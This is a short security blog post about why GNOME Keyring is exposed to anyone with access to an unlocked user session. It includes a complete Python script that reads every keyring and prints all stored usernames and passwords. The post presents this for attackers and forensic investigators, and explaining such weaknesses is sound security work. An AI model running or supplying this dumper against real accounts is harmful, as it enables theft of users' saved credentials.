---
title:  "Extracting GNOME Keyring Credentials"
categories: [Security]
---

![Logo](/assets/images/seal.jpg)

## Context
* Gnome Keyring is a (good:wink:) daemon that stores different security credentials encrypted in a file in the user’s home directory. It uses the login password for encryption, and after the keyring is decrypted at logon, the password is no longer necessary in the current user’s context. 
* Since usually password managers and tools of this kind are _more for users' convenience than security_, an attacker/forensic investigator with local access could easily extract specific credentials from the GUI application (_Applications -> Accessories -> Passwords and Encryption Keyrings_), without being prompted for anything to authorize him.
* Gnome Keyring does not protect against active attacks (when the attacker has access to user’s session). This is explained clearly in the [GNOME Keyring Security Philosophy](https://wiki.gnome.org/Projects/GnomeKeyring/SecurityPhilosophy):
> An active attacker might install an application on your computer, display a window, listen into the X events going to another window, read through your memory, snoop on you from a root account etc.
* The analogous application for KDE is [KWallet](https://utils.kde.org/projects/kwalletmanager/), which workes by the same principles. Oh, and there are python bindings is a python binding for this too.

## Dump keyring credentials using Python
```python
#
# Dumps all keys stored in Ubuntu keyrings
#

import gnomekeyring
 
def extract_keys():
    ''' Extract the usernames and passwords from all the keyrings'''
    
    for keyring in gnomekeyring.list_keyring_names_sync():
    # Get keyring name - "Login" is the default passwords keyring
        kr_name = keyring.title()
        print "Extracting keys from \"%s\" keyring:" % (kr_name)
        
        items = gnomekeyring.list_item_ids_sync(keyring);
        if len(items) == 0:
            print "Keyring \"%s\" is empty\n" % (kr_name)
            # If keyring is empty, continue to next keyring
            continue
        
        for i in range(0, len(items)):
            # Get information about an item (like description and secret)
            item_info = gnomekeyring.item_get_info_sync(keyring, items[i])
            description = item_info.get_display_name()
            password = item_info.get_secret()

            # Get attributes of an item (retrieve username)
            item_attr = gnomekeyring.item_get_attributes_sync(keyring, items[i])
            username = item_attr['username_value']

            print "[%d] %s" % (i, description)
            print " %s:%s" % (username, password)
        print ""
 
if __name__ == '__main__':
    extract_keys()
```
